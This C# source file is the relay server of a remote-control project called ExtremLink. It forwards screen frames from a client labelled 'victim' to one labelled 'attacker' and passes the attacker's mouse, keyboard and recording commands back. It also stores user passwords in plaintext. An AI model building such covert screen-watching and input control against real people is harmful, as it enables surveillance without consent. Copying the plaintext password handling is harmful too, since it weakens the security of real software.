using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Drawing;
using System.Drawing.Imaging;

// Networking modules
using System.Net;
using System.Net.Sockets;

// Data handling modules
using System.Data;
using System.Data.SqlClient;
using System.Net.Http;
using System.IO;
using System.IO.Compression;
using System.ComponentModel;
using System.Windows.Markup;
using System.Threading;
using System.Windows;
using System.Collections;
using System.Windows.Media.Imaging;
using System.Windows.Media;
using System.Net.NetworkInformation;
using System.Windows.Controls;
using System.Diagnostics;
using ExtremLink_Server.Classes;
using System.Net.Http.Headers;
using System.Printing;

namespace ExtremLink_Server.Classes
{
    public class Server
    {
        // A class which represent a server.
        // Attributes:
        
        // A string which represent the IP address of this server.
        private string serverIpAddress;
        public string ServerIpAddress
        {
            get { return this.serverIpAddress; }
        }
        
        // A string which represent the respond of the client respond:
        private string respond;
        public string Respond
        {
            get { return this.respond; }
        }

        // A client object which repreesnt the attacker client:
        private Client attacker;
        public Client Attacker
        {
            get { return this.attacker; }
        }

        // A client object which represent the victim client:
        private Client victim;
        public Client Victim
        {
            get { return this.victim; }
        }


        // Singleton behavior:
        private static Server serverInstance = null;
        public static Server ServerInstance
        {
            get
            {
                if (serverInstance == null)
                {
                    serverInstance = new Server();
                }
                return serverInstance;
            }
        }

        // Constructor:
        private Server()
        {
            this.respond = "";
            this.serverIpAddress = this.FindIpAddress();
            this.attacker = new Client(this.serverIpAddress, TypeOfClient.attacker);
            this.victim = new Client(this.serverIpAddress, TypeOfClient.victim);
            Log.LogInstance.AddMessage("🖧 Server Started");
        }


        // Finding ip address function:
        private string FindIpAddress()
        {
            // The function gets nothing.
            // The function sets the server's ip address according to the local ip address.
            IPAddress[] localIpsAddr = Dns.GetHostAddresses(Dns.GetHostName());
            return Convert.ToString(localIpsAddr[localIpsAddr.Length - 1]);
        }


        // Connecting functions:
        public void ConnectToClients()
        {
            // Input: Nothing.
            // Output: The function wait for clients (both attacker and victims) to connect to the server.
            Log.LogInstance.AddMessage("🔗 Server waiting for connections...");
            Task.Run(() => this.ConnectToAttacker());
            Task.Run(() => this.ConnectToVictim());
        }
        private async Task ConnectToAttacker()
        {
            // Input: Nothing.
            // Output: The function connects to the attacker.
            await this.attacker.ConnectToClient();
            Log.LogInstance.AddMessage("👨‍💻 Attacker connected");
            Task.Run(() => this.HandleAttackerTcpCommunication());
        }
        private async Task ConnectToVictim()
        {
            // Input: Nothing.
            // Output: The function connects to the victim.
            await this.victim.ConnectToClient();
            Log.LogInstance.AddMessage("💻 Victim connected");
            Task.Run(() => this.HandleVictimTcpCommunication());
            Task.Run(() => this.HandleUdpCommunication());
        }

        // Update attacker and client's ip about each other on each other.
        public void UpdateClientsIPAddress()
        {
            // Input: Nothing.
            // Output: The function sends the clients the ip of each other.
            this.attacker.SendTCPMessageToClient("G", $"{{\"victim\":\"{this.victim.IpAddress}\"}}");
            this.victim.SendTCPMessageToClient("G", $"{{\"attacker\":\"{this.attacker.IpAddress}\"}}");
        }

        // Messages handlers
        private async Task HandleUdpCommunication()
        {
            // The function gets nothing.
            // The fucntion handle with UDP packets which are sent by the client.
            // & - frames handling.
            while (true)
            {
                BitmapImage tempFrame = this.GetFrame();
                Log.LogInstance.AddMessage("A frame was received from the victim");
                this.SendFrame(this.ConvertBitmapImageToRenderTargetBitmap(tempFrame));
                Thread.Sleep(1000);
            }
        }
        private async Task HandleAttackerTcpCommunication()
        {
            // The function gets nothing.
            // The fucntion handle with different type of TCP packets which are sent by the attacker client.
            // The types of message are:
            // ~ - Rule choosing
            // ! - Database functionality
            // & - Frames handling
            // % - Mouse handling
            // ⌨ - Keyboard handling
            // $ - Sessions handling
            while (true)
            {
                lock (this)
                {
                    List<object> message = this.attacker.GetTCPMessageFromClient();
                    string data = (string)message[2];
                    switch (message[0])
                    {
                        case "!":
                            this.HandleUsersDatabaseMessages(data, TypeOfClient.attacker);
                            break;
                        case "&":
                            this.HandleFramesMessages(data, TypeOfClient.attacker);
                            break;
                        case "%":
                            this.HandleMouseMessages(data);
                            break;
                        case "⌨":
                            this.HandleKeyboardMessages(data);
                            break;
                    }
                }
            }
        }
        private async Task HandleVictimTcpCommunication()
        {
            // The function gets nothing.
            // The fucntion handle with different type of TCP packets which are sent by the victim client.
            // The types of message are:
            // ~ - Rule choosing
            // ! - Database functionality
            // & - Frames handling
            // % - Mouse handling
            // ⌨ - Keyboard handling
            // $ - Sessions handling
            while (true)
            {
                lock (this){
                    List<object> message = this.victim.GetTCPMessageFromClient();
                    string data = (string)message[2];
                    switch (message[0])
                    {
                        case "!":
                            this.HandleUsersDatabaseMessages(data, TypeOfClient.victim);
                            break;
                    }
                }
            }
        }
        
        // Handling clients' users managment type messages functions:       
        private void HandleLoginMessages(string data, TypeOfClient typeOfClient)
        {
            // Input: A string which represents a login message and the type of the client.
            // Output: The function handles with the login message.
            data = data.Replace("login,", "");
            string username = data.Split(",")[0].Split("=")[1];
            string password = data.Split(",")[1].Split("=")[1];
            if (this.IsUserExist(username, password, "ExtremLinkDB.mdf"))
            {
                switch (typeOfClient)
                {
                    case TypeOfClient.attacker:
                        this.attacker.SendTCPMessageToClient("!", "Exist");
                        this.attacker.User.UserName = username;
                        Log.LogInstance.AddMessage($"Attacker logged in as: 👤 {this.attacker.User.UserName}");
                        break;
                    case TypeOfClient.victim:
                        this.victim.SendTCPMessageToClient("!", "Exist");
                        this.victim.User.UserName = username;
                        Log.LogInstance.AddMessage($"Victim logged in as: 👤 {this.victim.User.UserName}");
                        break;
                }
            }
            else
            {
                switch (typeOfClient)
                {
                    case TypeOfClient.attacker:
                        this.attacker.SendTCPMessageToClient("!", "NotExist");
                        break;
                    case TypeOfClient.victim:
                        this.victim.SendTCPMessageToClient("!", "NotExist");
                        break;
                }
            }
        }
        private void HandleSignUpMessage(string data, TypeOfClient typeOfClient)
        {
            // Input: A string which represents a sign-up message and the type of the client.
            // Output: The function handles with the sign-up message.
            data = data.Replace("signup,", "");
            string[] parametersArr = data.Split(",");
            for (int i = 0; i < 7; i++)
            {
                parametersArr[i] = parametersArr[i].Split("=")[1];
            }

            if (this.AddUser(parametersArr, "ExtremLinkDB.mdf"))
            {
                switch (typeOfClient)
                {
                    case TypeOfClient.attacker:
                        this.attacker.SendTCPMessageToClient("!", "SuccessfullyAdded");
                        break;
                    case TypeOfClient.victim:
                        this.victim.SendTCPMessageToClient("!", "SuccessfullyAdded");
                        break;
                }
            }
            else
            {
                switch (typeOfClient)
                {
                    case TypeOfClient.attacker:
                        this.attacker.SendTCPMessageToClient("!", "NotAdded");
                        break;
                    case TypeOfClient.victim:
                        this.victim.SendTCPMessageToClient("!", "NotAdded");
                        break;
                }
            }
        }
        private void HandleUsersDatabaseMessages(string data, TypeOfClient typeOfClient)
        {
            // Input: A string which represents a message about users managment from the client and the type of the client.
            // Output: The function handles with the message.
            if (data.Contains("login"))
            {
                this.HandleLoginMessages(data, typeOfClient);
            }

            else if (data.Contains("signup"))
            {
                this.HandleSignUpMessage(data, typeOfClient);
            }
        }

        // Handling clients' frames type messages functions:
        private void HandleFramesMessages(string data, TypeOfClient typeOfClient)
        {
            // Input: A string which represents a message about frames from the client and the type of the client.
            // Output: The function handles with the message. 
            switch (data)
            {
                case "StartSendFrames":
                    this.victim.SendTCPMessageToClient("&", "StartSendFrames");
                    break;

                case "PauseSendFrames":
                    this.victim.SendTCPMessageToClient("&", "PauseSendFrames");
                    break;

                case "StopSendFrames":
                    this.victim.SendTCPMessageToClient("&", "StopSendFrames");
                    break;

                case "StartRecord":
                    this.victim.SendTCPMessageToClient("&", "StartRecord");
                    break;
            }
            Log.LogInstance.AddMessage($"Attacker sent {data} command");
        }

        // Handling attacker mouse commands messages function:
        private void HandleMouseMessages(string data)
        {
            // Input: A string which represents a message about mouse commands from the attacker.
            // Output: The function handles with the given message.
            this.victim.SendTCPMessageToClient("%", data);
        }

        // Handling attacker keyboard commands messages function:
        private void HandleKeyboardMessages(string data)
        {
            // Input: A string which represents a message about keyboard commands from the attacker.
            // Output: The function handles with the given message.
            this.victim.SendTCPMessageToClient("⌨", data);
        }



        // Getting frames function:
        public BitmapImage GetFrame()
        {
            try
            {
                // Store received packets
                Dictionary<int, byte[]> receivedPackets = new Dictionary<int, byte[]>();
                int streamId = -1;
                int totalPackets = -1;

                // Receive packets
                while (receivedPackets.Count < totalPackets || totalPackets == -1)
                {
                    // Buffer size for each packet
                    byte[] buffer = new byte[1412]; // 1400 + 12 bytes for metadata
                    int bytesRead = this.victim.UdpSocket.Receive(buffer);

                    // Extract metadata
                    int receivedStreamId = BitConverter.ToInt32(buffer, 0);
                    int receivedTotalPackets = BitConverter.ToInt32(buffer, 4);
                    int packetIndex = BitConverter.ToInt32(buffer, 8);

                    // Ensure packets are part of the same stream
                    if (streamId == -1) streamId = receivedStreamId;
                    if (totalPackets == -1) totalPackets = receivedTotalPackets;
                    if (streamId != receivedStreamId) continue;

                    // Extract segment data
                    byte[] segmentData = new byte[bytesRead - 12];
                    Array.Copy(buffer, 12, segmentData, 0, bytesRead - 12);

                    // Store segment if not already received
                    if (!receivedPackets.ContainsKey(packetIndex))
                    {
                        receivedPackets[packetIndex] = segmentData;
                    }
                }

                // Reassemble the file content
                using (var fileStream = new FileStream("tempFrame.png", FileMode.Create))
                {
                    for (int i = 0; i < totalPackets; i++)
                    {
                        if (receivedPackets.TryGetValue(i, out var segment))
                        {
                            fileStream.Write(segment, 0, segment.Length);
                        }
                        else
                        {
                            throw new Exception($"Missing packet {i}");
                        }
                    }
                }

                // Load the PNG file to a BitmapImage object
                var bitmap = new BitmapImage();
                using (var stream = new FileStream("tempFrame.png", FileMode.Open, FileAccess.Read))
                {
                    bitmap.BeginInit();
                    bitmap.CacheOption = BitmapCacheOption.None;
                    bitmap.StreamSource = stream;
                    bitmap.EndInit();
                }
                bitmap.Freeze();
                return bitmap;

            }
            catch (Exception ex)
            {
                MessageBox.Show($"An error occurred: {ex.Message}");
                return null;
            }
        }

        // Sending frame functions:
        private byte[] ConvertRenderTargetBitmapToByteArray(RenderTargetBitmap renderTarget)
        {
            // The function gets a RenderTargetBitmap object.
            // The function returns the given object as a byte array.
            PngBitmapEncoder encoder = new PngBitmapEncoder();
            encoder.Frames.Add(BitmapFrame.Create(renderTarget));

            using (MemoryStream ms = new MemoryStream())
            {
                encoder.Save(ms);
                return ms.ToArray();
            }
        }
        public RenderTargetBitmap ConvertBitmapImageToRenderTargetBitmap(BitmapImage bitmapImage)
        {
            int width = bitmapImage.PixelWidth;
            int height = bitmapImage.PixelHeight;

            // Create a RenderTargetBitmap with the same size as the BitmapImage
            RenderTargetBitmap renderTargetBitmap = new RenderTargetBitmap(width, height, 96, 96, PixelFormats.Pbgra32);

            // Create a DrawingVisual to render the BitmapImage
            DrawingVisual drawingVisual = new DrawingVisual();
            using (DrawingContext drawingContext = drawingVisual.RenderOpen())
            {
                drawingContext.DrawImage(bitmapImage, new System.Windows.Rect(0, 0, width, height));
            }

            // Render the DrawingVisual to the RenderTargetBitmap
            renderTargetBitmap.Render(drawingVisual);

            return renderTargetBitmap;
        }
        private void CreatePngImageFile(byte[] fileContent)
        {
            string fileName = "tempFrame.png";
            string filePath = Path.Combine(Directory.GetCurrentDirectory(), fileName);

            try
            {
                // Write the byte array to a file
                using (FileStream fileStream = new FileStream(filePath, FileMode.Create, FileAccess.Write))
                {
                    fileStream.Write(fileContent, 0, fileContent.Length);
                }

                // MessageBox.Show($"File created successfully at: {filePath}", "Success", MessageBoxButton.OK, MessageBoxImage.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"An error occurred while creating the PNG file: {ex.Message}", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
            }
        }
        private byte[] GetFileContent(string fileName)
        {
            try
            {
                // Read all bytes of the file into a byte array
                byte[] fileContent = File.ReadAllBytes(fileName);
                return fileContent;
            }
            catch (Exception ex)
            {
                // Handle exceptions such as file not found or permission issues
                throw new IOException($"Failed to read file content: {ex.Message}", ex);
            }
        }
        public void SendFrame(RenderTargetBitmap renderTarget)
        {
            // Convert RenderTargetBitmap to byte array
            byte[] frameData = this.ConvertRenderTargetBitmapToByteArray(renderTarget);

            // Create a temporary PNG file for debugging and future use
            this.CreatePngImageFile(frameData);

            // Get the file content
            byte[] fileContent = GetFileContent("tempFrame.png");

            // Define packet size (MTU-safe)
            const int packetSize = 1400; // Keeping under the MTU limit
            int totalPackets = (int)Math.Ceiling((double)fileContent.Length / packetSize);

            // Generate a random stream ID to identify this data stream
            int streamId = new Random().Next(1, int.MaxValue);

            // Send packets
            for (int i = 0; i < totalPackets; i++)
            {
                // Calculate packet bounds
                int offset = i * packetSize;
                int size = Math.Min(packetSize, fileContent.Length - offset);

                // Construct packet (12 bytes of metadata + segment data)
                byte[] packet = new byte[size + 12];
                BitConverter.GetBytes(streamId).CopyTo(packet, 0);          // 4 bytes: Stream ID
                BitConverter.GetBytes(totalPackets).CopyTo(packet, 4);     // 4 bytes: Total packets
                BitConverter.GetBytes(i).CopyTo(packet, 8);                // 4 bytes: Packet index
                Array.Copy(fileContent, offset, packet, 12, size);         // Segment data

                // Send packet
                this.attacker.UdpSocket.SendTo(packet, new IPEndPoint(IPAddress.Parse(this.attacker.IpAddress), this.attacker.ATTACKER_UDP_PORT));
            }
        }



        // SQL database queries functions
        public static SqlConnection ConnectToDB(string fileName)
        {
            string baseDirectory = AppDomain.CurrentDomain.BaseDirectory;
            // Navigate up from bin/Debug to the project root
            string projectRoot = Directory.GetParent(baseDirectory).Parent.Parent.Parent.FullName;
            string dbPath = Path.Combine(projectRoot, "Databases", fileName);
            string connectionString = $@"Data Source=(LocalDB)\MSSQLLocalDB;AttachDbFilename={dbPath};Integrated Security=True";
            SqlConnection conn = new SqlConnection(connectionString);
            return conn;
        }
        public bool IsUserExist(string username, string password, string databaseFileName)
        {
            string sqlQuery = "SELECT * FROM [dbo].[Table] WHERE username = @username AND password = @password";
            bool found = false;
            using (SqlConnection conn = ConnectToDB(databaseFileName))
            {
                try
                {
                    conn.Open();
                    using (SqlCommand com = new SqlCommand(sqlQuery, conn))
                    {
                        // Add parameters to the command to avoid SQL injection
                        com.Parameters.AddWithValue("@username", username);
                        com.Parameters.AddWithValue("@password", password);

                        object result = com.ExecuteScalar();
                        int count = result == null ? 0 : Convert.ToInt32(result);
                        // If count is greater than 0, the user exists
                        found = (count > 0);
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show("Connection failed: " + ex.Message);
                }
            }
            // MessageBox.Show(Convert.ToString(found));
            return found;
        }
        public bool AddUser(string[] parameters, string databaseFileName)
        {
            // The function gets an array of parameters.
            // The function returns true if the user isn't in the database and creates
            // a new user according to the paramters, otherwise return false.
            if (this.IsUserExist(parameters[4], parameters[5], "ExtremLinkDB.mdf")) {return false;}
            string amoutOfUserSqlQuery = "SELECT COUNT(*) FROM [dbo].[Table]";
            string addUserSqlQuery = "INSERT INTO [dbo].[Table] (Id, firstName, lastName, city, phone, username, password, email) VALUES (@userID, @firstname, @lastname, @city, @phone, @username, @password, @email)";
            int amountOfUsers = 0;
            using (SqlConnection conn = ConnectToDB(databaseFileName))
            {
                try
                {
                    conn.Open();
                    // Retrieve the amout of users in the database
                    using (SqlCommand com1 = new SqlCommand(amoutOfUserSqlQuery, conn))
                    {
                        amountOfUsers = (int)com1.ExecuteScalar();
                    }
                    using (SqlCommand com2 = new SqlCommand(addUserSqlQuery, conn))
                    {
                        // Add parameters to the command to avoid SQL injection
                        com2.Parameters.AddWithValue("@userID", amountOfUsers+1);
                        com2.Parameters.AddWithValue("@firstname", parameters[0]);
                        com2.Parameters.AddWithValue("@lastname", parameters[1]);
                        com2.Parameters.AddWithValue("@city", parameters[2]);
                        com2.Parameters.AddWithValue("@phone", parameters[3]);
                        com2.Parameters.AddWithValue("@username", parameters[4]);
                        com2.Parameters.AddWithValue("@password", parameters[5]);
                        com2.Parameters.AddWithValue("@email", parameters[6]);
                        com2.ExecuteNonQuery();
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show("Connection failed: " + ex.Message);
                }
            }
            return true;
        }

    }
}
